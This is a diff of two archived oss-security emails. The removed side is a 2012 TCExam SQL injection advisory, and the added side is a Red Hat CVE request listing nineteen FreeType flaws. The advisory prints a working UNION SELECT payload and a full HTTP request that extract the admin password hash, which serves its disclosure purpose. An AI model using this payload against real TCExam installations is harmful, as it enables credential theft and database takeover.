@@ -1,219 +1,332 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2012/08/13/8
-Message-ID: <035d01cd7974$87f3ee10$97dbca30$@reactionis.co.uk>
-Date: Mon, 13 Aug 2012 17:56:05 +0100
-From: "research" <research@...ctionis.co.uk>
-To: "'full-disclosure'" <full-disclosure@...ts.grok.org.uk>, "'bugtraq'" <bugtraq@...urityfocus.com>, <secalert@...urityreason.com>, <bugs@...uritytracker.com>, "'vuln'" <vuln@...unia.com>, <vuln@...urity.nnov.ru>, <news@...uriteam.com>, <moderators@...db.org>, <submissions@...ketstormsecurity.org>, <submit@...ecurity.com>, <oss-security@...ts.openwall.com>
-Subject: TCExam Edit SQL Injection 
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2012/03/06/13
+Message-ID: <4F566C18.2010301@redhat.com>
+Date: Tue, 06 Mar 2012 20:57:12 +0100
+From: Jan Lieskovsky <jlieskov@...hat.com>
+To: "Steven M. Christey" <coley@...us.mitre.org>
+CC: oss-security@...ts.openwall.com, Mateusz Jurczyk <mjurczyk@...gle.com>, Werner Lemberg <wl@....org>, Moritz Muehlenhoff <jmm@...ian.org>, Moritz Muehlenhoff <jmm@...til.org>
+Subject: CVE Request -- FreeType: Multiple security flaws to be fixed in v2.4.9
 Content-Type: text/plain; charset=utf-8
 
-/---------------------------\
+Hello Kurt, Steve, vendors,
 
-| TCExam Edit SQL Injection |
+   we have been notified by Mateusz Jurczyk of the Google Security Team,
+about the following FreeType security flaws, which are going to be fixed
+in v2.4.9 version.
 
-\---------------------------/
+Credit: Mateusz Jurczyk, Google Security Team
 
- 
+Note: Though some the issues below might look like related / the same, I have
+       checked that each of them exclude themselves (IOW each of them is different
+       issue like the another. But was lazy to cross-reference those, which of them
+       is different from which another.
 
- 
+       Reproducers are attached to relevant upstream bug reports.
 
-Summary
+       Have Cc-ed Werner Lemberg of FreeType upstream on this post too, so he could
+       collect CVE identifiers prior FreeType v2.4.9 release.
 
-=======
+       Yet, requesting CVE identifier even for the NULL ptr dereference and floating
+       point exception / integer divide by zero issue below, even if Red Hat would not
+       consider these to be security flaws. But other distributions might be doing so,
+       thus will let Steve to decide, if these two desire CVE identifiers or not.
 
- 
+       And finally, due the count of the issues, not including full issues description
+       under each entry (to shorten the request). Only particular Red Hat Bugzilla entry
+       summary is included with relevant links to upstream bugs and commits. Further issue
+       description can be found under particular Red Hat Bugzilla entry for each of them
+       in initial comment (#c0).
 
-TCExam 11.3.007 is prone to a SQL injection flaw located in
-tce_edit_answer.php and tce_edit_question.php. These files pass a
-'subject_module_id' parameter into a SQL statement without satisfactory
-sanitisation. An attacker with authoring permissions could leverage this
-vulnerability to take full control of the database.
+Kurt, Steve, could you allocate CVE identifiers for these?
 
- 
+Thank you && Regards, Jan.
+--
+Jan iankko Lieskovsky / Red Hat Security Response Team
 
-CVE number: CVE-2012-4237
 
-Impact: High
 
-Vendor homepage: http://www.tcexam.org/
 
-Vendor notified: 06/08/2012
+Issue #1:
+=========
+   freetype: Out-of heap-based buffer read by parsing, adding properties in BDF
+   fonts, or validating if property being an atom (FU#35597, FU#35598)
 
-Vendor fixed: 06/08/2012
+Upstream bug reports:
+[1] https://savannah.nongnu.org/bugs/?35597
+[2] https://savannah.nongnu.org/bugs/?35598
 
-Credit: Chris Cooper of Reaction Information Security
-(http://www.reactionis.co.uk/)
+Upstream patch:
+[3] 
+http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=320d4976d1d010b5abe9d61a7423d8ca06bc34df
 
- 
+Red Hat Bugzilla entry:
+[4] https://bugzilla.redhat.com/show_bug.cgi?id=800581
 
-This advisory is posted at:
+Issue #2:
+=========
+   freetype: Out-of heap-based buffer read by parsing glyph information and
+   bitmaps for BDF fonts (FU#35599, FU#35600)
 
- 
+Upstream bug reports:
+[1] https://savannah.nongnu.org/bugs/?35599
+[2] https://savannah.nongnu.org/bugs/?35600
 
-http://www.reactionpenetrationtesting.co.uk/tcexam-sql-injection.html
+Upstream patch:
+[3] 
+http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=0b1c0c6b20bf121096afff206d570f26183402b3
 
- 
+Red Hat Bugzilla entry:
+[4] https://bugzilla.redhat.com/show_bug.cgi?id=800583
 
- 
+Issue #3:
+=========
+   freetype: NULL pointer dereference by moving zone2 pointer point for certain
+   TrueType font (FU#35601)
 
-Affected Products
+Upstream bug report:
+[1] https://savannah.nongnu.org/bugs/?35601
 
-======== ========
+Upstream patch:
+[2] 
+http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=96cddb8d1d32d6738b06552083db9d6cee5b5cb4
 
- 
+Red Hat Bugzilla entry:
+[3] https://bugzilla.redhat.com/show_bug.cgi?id=800584
 
-Confirmed in TCExam 11.3.007. Prior versions may also be affected.
+Issue #4:
+=========
+   freetype: Out-of heap-based buffer read when parsing certain SFNT strings
+   by Type42 font parser (FU#35602)
 
- 
+Upstream bug report:
+[1] https://savannah.nongnu.org/bugs/?35602
 
- 
+Upstream patch:
+[2] 
+http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=82365c0dead99dd119d9e7117cf4f36ce1d1cbe1
 
-Details
+Red Hat Bugzilla entry:
+[3] https://bugzilla.redhat.com/show_bug.cgi?id=800585
 
-=======
+Issue #5:
+=========
+   freetype: Out-of heap-based buffer read by loading properties of PCF
+   fonts (FU#35603)
 
- 
+Upstream bug report:
+[1] https://savannah.nongnu.org/bugs/?35603
 
-The 'subject_module_id' parameters in the tce_edit_answer.php and
-tce_edit_question.php pages were found to be subject to a SQL injection
-vulnerability. It was possible to inject arbitrary SQL statements into a
-WHERE clause, retrieving information from the database via the page output.
-The attacker must be authenticated as a valid user with a permission level
-of 5 or above in order for the attack to be successful.
+Upstream patch:
+[2] 
+http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=c776fc17bfeaa607405fc96620e9445e7a0965c3
 
- 
+Red Hat Bugzilla entry:
+[3] https://bugzilla.redhat.com/show_bug.cgi?id=800587
 
-The following payload will extract the admin password hash (some characters
-may need to be URL encoded):
+Issue #6:
+=========
+   freetype (64-bit specific): Out-of heap-based buffer read by attempt to
+   record current cell into the cell table (FU#35604)
 
- 
+Upstream bug report:
+[1] https://savannah.nongnu.org/bugs/?35604
 
-999999.9 union all select (select
-concat(0x7e,0x27,tce_users.user_password,0x27,0x7e) from `tcexam`.tce_users
-where tce_users.user_name = CHAR(97,100,109,105,110) limit 0,1)
-,0x0,0x0,0x0,0x0,0x0--
+Upstream patch:
+[2] 
+http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=fcbc82e69e7b114b0db75e955896107d611898e6
 
- 
+Red Hat Bugzilla entry:
+[3] https://bugzilla.redhat.com/show_bug.cgi?id=800589
 
----
+Issue #7:
+=========
+   freetype: Out-of heap-based buffer read flaw in Type1 font loader by
+   parsing font dictionary entries (FU#35606)
 
-Example Request:
+Upstream bug report:
+[1] https://savannah.nongnu.org/bugs/?35606
 
-+---------------
+Upstream patch:
+[2] 
+http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=58cbc465d2ccd904dee755cff791fbb3a866646d
 
- 
+Red Hat Bugzilla entry:
+[3] https://bugzilla.redhat.com/show_bug.cgi?id=800590
 
-GET
-/TCExam/admin/code/tce_edit_answer.php?subject_module_id=999999.9+union+all+
-select+%28select+concat%280x7e%2C0x27%2Ctce_users.user_password%2C0x27%2C0x7
-e%29+from+%60tcexam%60.tce_users+where+tce_users.user_name+%3d+CHAR(97,100,1
-09,105,110)+limit+0%2C1%29+%2C0x0%2C0x0%2C0x0%2C0x0%2C0x0--&question_subject
-_id=3&answer_question_id=7 HTTP/1.1
+Issue #8:
+=========
+   freetype: Out-of heap-based buffer write by parsing BDF glyph information
+   and bitmaps (FU#35607)
 
-Host: 192.168.0.6
+Upstream bug report:
+[1] https://savannah.nongnu.org/bugs/?35607
 
-Referer: http://192.168.0.6/TCExam/admin/code/tce_edit_question.php
+Upstream patch:
+[2] 
+http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=28dd2c45957278e962f95633157b6139de8170aa
 
-Cookie: PHPSESSID=db1fe2b665994ff76356e7a28abfa5df
+Red Hat Bugzilla entry:
+[3] https://bugzilla.redhat.com/show_bug.cgi?id=800591
 
- 
+Issue #9:
+=========
+   freetype: Out-of heap-based buffer write in Type1 font parser by retrieving
+   font's private dictionary (FU#35608)
 
----
+Upstream bug report:
+[1] https://savannah.nongnu.org/bugs/?35608
 
-Example Response:
+Upstream patch:
+[2] 
+http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=d9577add645c8c05460c7d60ad486c021394b82e
 
-+----------------
+Red Hat Bugzilla entry:
+[3] https://bugzilla.redhat.com/show_bug.cgi?id=800592
 
- 
+Issue #10:
+==========
+   freetype: Out-of heap-based buffer read in TrueType bytecode interpreter
+   by executing NPUSHB and NPUSHW instructions (FU#35640)
 
---- SNIP ---
+Upstream bug report:
+[1] https://savannah.nongnu.org/bugs/?35640
 
-<select name="question_subject_id" id="question_subject_id" size="0"
-onchange="document.getElementById('form_answereditor').changesubject.value=1
-; document.getElementById('form_answereditor').submit();" title="test
-topic"> <option value="~'c574b5b09ab10f4f39ae9dce6d539cf0'~">1. -
-[%00]</option> </select>
+Upstream patch:
+[2] 
+http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=5dddcc45a03b336860436a180aec5b358517336b
 
---- SNIP ---
+Red Hat Bugzilla entry:
+[3] https://bugzilla.redhat.com/show_bug.cgi?id=800593
 
- 
+Issue #11:
+==========
+   freetype: Out-of heap-based buffer write by parsing BDF glyph and bitmaps
+   information with missing ENCODING field (FU#35641)
 
-Impact
+Upstream bug report:
+[1] https://savannah.nongnu.org/bugs/?35641
 
-======
+Upstream patch:
+[2] 
+http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=4086fb7caf41e33137e548e43a49a97b127cd369
 
- 
+Red Hat Bugzilla entry:
+[3] https://bugzilla.redhat.com/show_bug.cgi?id=800594
 
-An authenticated user with a permission level of 5 or higher could take full
-control of the database, essentially allowing them to escalate their
-privileges by either directly controlling the database, cracking an
-administrator password or potentially changing their own permission level.
-Furthermore, an attacker might be able to leverage this vulnerability in
-order to further compromise the host machine.
+Issue #12:
+==========
+   freetype: Out-of heap-based buffer read by parsing BDF font header (FU#35643)
 
- 
+Upstream bug report:
+[1] https://savannah.nongnu.org/bugs/?35643
 
-Solution
+Upstream patch:
+[2] 
+http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=cee5d593582801f65c5e127d9de9ca24ebcdc747
 
-========
+Red Hat Bugzilla entry:
+[3] https://bugzilla.redhat.com/show_bug.cgi?id=800595
 
- 
+Issue #13:
+==========
+   freetype: Out-of heap-based buffer read in the TrueType bytecode
+   interpreter by executing the MIRP instruction (FU#35646)
 
-Upgrade to TCExam 11.3.008.
+Upstream bug report:
+[1] https://savannah.nongnu.org/bugs/?35646
 
- 
+Upstream patch:
+[2] 
+http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=a33c013fe2dc6e65de2879682201d9c155292349
 
- 
+Red Hat Bugzilla entry:
+[3] https://bugzilla.redhat.com/show_bug.cgi?id=800597
 
-Distribution
+Issue #14:
+==========
+   freetype: Array index error, leading to out-of stack based buffer
+   read by parsing BDF font glyph information (FU#35656)
 
-============
+Upstream bug report:
+[1] https://savannah.nongnu.org/bugs/?35656
 
- 
+Upstream patch:
+[2] 
+http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=6ac022dc750d95296a6f731b9594f2e751d997fa
 
-In addition to posting on the website, a text version of this notice has
-been posted to the following e-mail and Usenet news recipients.
+Red Hat Bugzilla entry:
+[3] https://bugzilla.redhat.com/show_bug.cgi?id=800598
 
- 
+Issue #15:
+==========
+   freetype: Out-of heap-based buffer read by conversion of PostScript font objects (FU#35657)
 
-* bugtraq () securityfocus com
+Upstream bug report:
+[1] https://savannah.nongnu.org/bugs/?35657
 
-* full-disclosure () lists grok org uk
+Upstream patch:
+[2] 
+http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=292144b44a15c1a72f2ef76475d65b7a3a3fba67
 
- 
+Red Hat Bugzilla entry:
+[3] https://bugzilla.redhat.com/show_bug.cgi?id=800600
 
-Future updates of this advisory, if any, will be placed on the ReactionIS
-corporate website, but may or may not be actively announced on mailing lists
-or newsgroups. Users concerned about this problem are encouraged to check
-the URL below for any updates:
+Issue #16:
+==========
+   freetype: Out-of heap-based buffer read flaw by conversion of an ASCII
+   string into a signed short integer by processing BDF fonts (FU#35658)
 
- 
+Upstream bug report:
+[1] https://savannah.nongnu.org/bugs/?35658
 
-http://www.reactionpenetrationtesting.co.uk/tcexam-sql-injection.html
+Upstream patch:
+[2] 
+http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=d9c1659610f9cd5e103790cb5963483d65cf0d2d
 
- 
+Red Hat Bugzilla entry:
+[3] https://bugzilla.redhat.com/show_bug.cgi?id=800602
 
-============================================================================
-==
+Issue #17:
+==========
+   freetype: Out-of heap-based buffer write by retrieval of advance values
+   for glyph outlines (FU#35659)
 
- 
+Upstream bug report:
+[1] https://savannah.nongnu.org/bugs/?35659
 
-Reaction Information Security 
+Upstream patch:
+[2] 
+http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=7d35a7dc7cc621538a1f4a63c83ebf223aace0b0
 
-Lombard House Business Centre,
+Red Hat Bugzilla entry:
+[3] https://bugzilla.redhat.com/show_bug.cgi?id=800604
 
-Suite 117,
+Issue #18:
+==========
+   freetype: Integer divide by zero by performing arithmetic
+   computations for certain fonts (FU#35660)
 
-12-17 Upper Bridge Street,
+Upstream bug report:
+[1] https://savannah.nongnu.org/bugs/?35660
 
-Canterbury, Kent, CT1 2NF
+Upstream patch:
+[2] 
+http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=ba67957d5ead443f4b6b31805d6e780d54361ca4
 
- 
+Red Hat Bugzilla entry:
+[3] https://bugzilla.redhat.com/show_bug.cgi?id=800606
 
-Phone: +44 (0)1227 785050
+Issue #19:
+==========
+   freetype: Out-of heap-based buffer write in the TrueType bytecode
+   interpreter by moving zone2 pointer point (FU#35689)
 
-Email: research () reactionis {dot} co {dot} uk
+Upstream bug report:
+[1] https://savannah.nongnu.org/bugs/?35689
 
-Web: http://www.reactionpenetrationtesting.co.uk
+Upstream patch:
+[2] 
+http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=0fc8debeb6c2f6a8a9a2b97332a7c8a0a1bd9e85
 
-
+Red Hat Bugzilla entry:
+[3] https://bugzilla.redhat.com/show_bug.cgi?id=800607
